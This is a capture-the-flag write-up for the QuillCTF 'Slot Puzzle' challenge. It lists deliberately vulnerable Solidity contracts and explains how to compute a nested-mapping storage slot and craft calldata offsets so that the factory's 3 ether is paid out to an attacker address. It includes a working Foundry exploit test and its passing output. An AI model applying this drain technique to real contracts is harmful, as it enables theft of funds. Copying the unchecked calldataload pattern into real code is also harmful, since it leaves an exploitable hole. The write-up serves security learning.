# QuillCTF : Slot Puzzle

## Objective of CTF

Your purpose is just to call the deploy() function to recover the 3 ether.

### Contract code

SlotPuzzle.sol :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "./interface/ISlotPuzzleFactory.sol";

contract SlotPuzzle {
    bytes32 public immutable ghost = 0x68747470733a2f2f6769746875622e636f6d2f61726176696e64686b6d000000;    
    ISlotPuzzleFactory public factory;

    struct ghostStore {
        bytes32[] hash;
        mapping (uint256 => mapping (address => ghostStore)) map;
    }

    mapping(address => mapping (uint256 => ghostStore)) private ghostInfo;

    error InvalidSlot();
    constructor() {
        ghostInfo[tx.origin][block.number]
        .map[block.timestamp][msg.sender]
        .map[block.prevrandao][block.coinbase]
        .map[block.chainid][address(uint160(uint256(blockhash(block.number - block.basefee))))]
        .hash.push(ghost);

        factory = ISlotPuzzleFactory(msg.sender);
    }

    function ascertainSlot(Parameters calldata params) external returns (bool status) {
        require(address(factory) == msg.sender);
        require(params.recipients.length == params.totalRecipients);

        bytes memory slotKey = params.slotKey;
        bytes32 slot;
        uint256 offset = params.offset;

        assembly {
            offset := calldataload(offset)
            slot := calldataload(add(slotKey,offset))
        }

        getSlotValue(slot,ghost);

        for(uint8 i=0;i<params.recipients.length;i++) {
            factory.payout(
                params.recipients[i].account,
                params.recipients[i].amount
            );
        }

        return true;
    }

    function getSlotValue(bytes32 slot,bytes32 validResult) internal view {      
        bool validOffsets;
        assembly {
            validOffsets := eq(
                sload(slot),
                validResult
            )
        }

        if (!validOffsets) {
            revert InvalidSlot();
        }
    }

    function getGhostGit() public pure returns (string memory) {
        return string(abi.encodePacked(ghost));
    }    
}
```

SlotPuzzleFactory.sol :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
import {SlotPuzzle} from "./SlotPuzzle.sol";
import {EnumerableSet} from "openzeppelin-contracts/utils/structs/EnumerableSet.sol";
import "./interface/ISlotPuzzleFactory.sol";

contract SlotPuzzleFactory is ReentrancyGuard{
    using EnumerableSet for EnumerableSet.AddressSet;
    using SafeTransferLib for address;

    EnumerableSet.AddressSet deployedAddress;

    constructor() payable {
        require(msg.value == 3 ether);
    }

    function deploy(Parameters calldata params) external nonReentrant {
        SlotPuzzle newContract = new SlotPuzzle();

        deployedAddress.add(address(newContract));   
        newContract.ascertainSlot(params); 
    }

    function payout(address wallet,uint256 amount) external {
        require(deployedAddress.contains(msg.sender));
        require(amount == 1 ether);
        wallet.safeTransferETH(amount);
    }   
}
```

ISlotPuzzleFactory.sol :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

struct Recipients{
    address account;
    uint256 amount;
}

struct Parameters{
    uint256 totalRecipients;
    uint256 offset;
    Recipients[] recipients;
    bytes slotKey;
}

interface ISlotPuzzleFactory {
    function payout(address wallet,uint256 amount) external;
    function ascertainSlot(Parameters calldata params) external returns (bool status);
}
```

### Foundry setup
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters,Recipients} from "src/interface/ISlotPuzzleFactory.sol";


contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;
    SlotPuzzleFactory public slotPuzzleFactory;
    address hacker;

    function setUp() public {
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        hacker = makeAddr("hacker");
    }

    function testHack() public {
        vm.startPrank(hacker,hacker);
        assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

        //hack time

        assertEq(address(slotPuzzleFactory).balance, 0, "weth contract should have 0 ether");
        assertEq(address(hacker).balance, 3 ether, "hacker should have 3 ether");

        
        vm.stopPrank();
    }
}
```

The foundry setup will deploy the factory contract and send 3 ether to it, our goal is to get that 3 ether back

```solidity
    function payout(address wallet,uint256 amount) external {
        require(deployedAddress.contains(msg.sender));
        require(amount == 1 ether);
        wallet.safeTransferETH(amount);
    }  
```
There is a `payout()` function in the factory, which when called by the slot puzzle contract it deployed, will transfer 1 ether to the wallet, so we have to make the slot puzzle contract to call the factory with our hacker address as wallet and 1 ether as amount

The deploy function will deploy a new slot puzzle, add it to `deployedAddress` and call `ascertainSlot()` function in slot puzzle it just deployed, which the function only can be called by the factory :
```solidity
    function deploy(Parameters calldata params) external nonReentrant {
        SlotPuzzle newContract = new SlotPuzzle();

        deployedAddress.add(address(newContract));   
        newContract.ascertainSlot(params); 
    }
```

The `ascertainSlot()` function can call `payout()` in factory if we pass all those requirements above :
```solidity
    function ascertainSlot(Parameters calldata params) external returns (bool status) {
        require(address(factory) == msg.sender);
        require(params.recipients.length == params.totalRecipients);

        bytes memory slotKey = params.slotKey;
        bytes32 slot;
        uint256 offset = params.offset;

        assembly {
            offset := calldataload(offset)
            slot := calldataload(add(slotKey,offset))
        }

        getSlotValue(slot,ghost);

        for(uint8 i=0;i<params.recipients.length;i++) {
            factory.payout(
                params.recipients[i].account,
                params.recipients[i].amount
            );
        }

        return true;
    }
```

It will call `getSlotValue()`, which will load the storage slot `slot` and compare it to see if it equals to the ghost value

In the slot puzzle contract constructor, it will store the `ghost` value to somewhere in storage in a complex way

```solidity
    constructor() {
        ghostInfo[tx.origin][block.number]
        .map[block.timestamp][msg.sender]
        .map[block.prevrandao][block.coinbase]
        .map[block.chainid][address(uint160(uint256(blockhash(block.number - block.basefee))))]
        .hash.push(ghost);

        factory = ISlotPuzzleFactory(msg.sender);
    }
```

So we have to find the storage slot that stored the ghost value

https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html

https://ethereum.stackexchange.com/questions/138935/when-storing-a-struct-in-mapping-how-does-the-evm-storage-layout-handle-if-the

We can get the storage slot with this, as hacker address will be `tx.origin` and factory address will be `msg.sender` in the `ascertainSlot()` function call
```solidity
keccak256(abi.encode(keccak256(abi.encode(address(uint160(uint256(blockhash(block.number - block.basefee)))), keccak256(abi.encode(block.chainid, bytes32(uint256(keccak256(abi.encode(block.coinbase, keccak256(abi.encode(block.prevrandao, bytes32(uint256(keccak256(abi.encode(address(slotPuzzleFactory), keccak256(abi.encode(block.timestamp, bytes32(uint256(keccak256(abi.encode(block.number, keccak256(abi.encode(hacker, uint256(1)))))) + 1)))))) + 1)))))) + 1)))))))
```

Then we can set the `Parameters` struct, set the `totalRecipients` to 3, as `payout()` can only send 1 ether per function call, and there is 3 ether in total, so we will make it to call `payout()` 3 times with our hacker address and 1 ether as amount for the `recipients` struct array

Then there is the `offset` and `slotKey`, however the `slotKey` we set here will not directly be the slot key it used for calling `getSlotValue()`

```solidity
        bytes memory slotKey = params.slotKey;
        bytes32 slot;
        uint256 offset = params.offset;

        assembly {
            offset := calldataload(offset)
            slot := calldataload(add(slotKey,offset))
        }

        getSlotValue(slot,ghost);
```

For the `offset`, it will use it as the offset for calldataload to load a value in calldata and assign it back to the `offset` variable, to make the `offset` to whatever we want, we can append a value in slotKey after the actual storage slot we set, so that value will be in the end of the calldata, and we can just use `console.log` to view the calldata and find the offset needed to get that value and set that as the `offset` in `Parameters` struct

After that it will just add up the reference of `slotKey` in memory and `offset` and use that as the offset for calldataload to load a value in calldata to `slot`, which will be used for `getSlotValue()`, to get the slot we set correctly, I just use `console.log` to view the msg.data and find the offset needed

Finally it will iterate the `recipients` struct array and send us 1 ether for 3 times and we will get all 3 ethers in total and the challenge is solved

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters,Recipients} from "src/interface/ISlotPuzzleFactory.sol";


contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;
    SlotPuzzleFactory public slotPuzzleFactory;
    address hacker;

    function setUp() public {
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        hacker = makeAddr("hacker");
    }

    function testHack() public {
        vm.startPrank(hacker,hacker);
        assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

        //hack time
        Recipients memory recipient = Recipients(hacker, 1 ether);
        Recipients[] memory recipients = new Recipients[](3);
        recipients[0] = recipient;
        recipients[1] = recipient;
        recipients[2] = recipient;
        bytes32 slotKey = keccak256(abi.encode(keccak256(abi.encode(address(uint160(uint256(blockhash(block.number - block.basefee)))), keccak256(abi.encode(block.chainid, bytes32(uint256(keccak256(abi.encode(block.coinbase, keccak256(abi.encode(block.prevrandao, bytes32(uint256(keccak256(abi.encode(address(slotPuzzleFactory), keccak256(abi.encode(block.timestamp, bytes32(uint256(keccak256(abi.encode(block.number, keccak256(abi.encode(hacker, uint256(1)))))) + 1)))))) + 1)))))) + 1)))))));
        Parameters memory param = Parameters(3, 452, recipients, abi.encode(slotKey, uint256(0x124)));
        slotPuzzleFactory.deploy(param);        

        assertEq(address(slotPuzzleFactory).balance, 0, "weth contract should have 0 ether");
        assertEq(address(hacker).balance, 3 ether, "hacker should have 3 ether");

        
        vm.stopPrank();
    }
}
```

### Foundry test output

```
# forge test -vv
[⠔] Compiling...
No files changed, compilation skipped

Running 1 test for test/SlotPuzzle.t.sol:SlotPuzzleTest
[PASS] testHack() (gas: 536254)
Test result: ok. 1 passed; 0 failed; finished in 1.03ms
```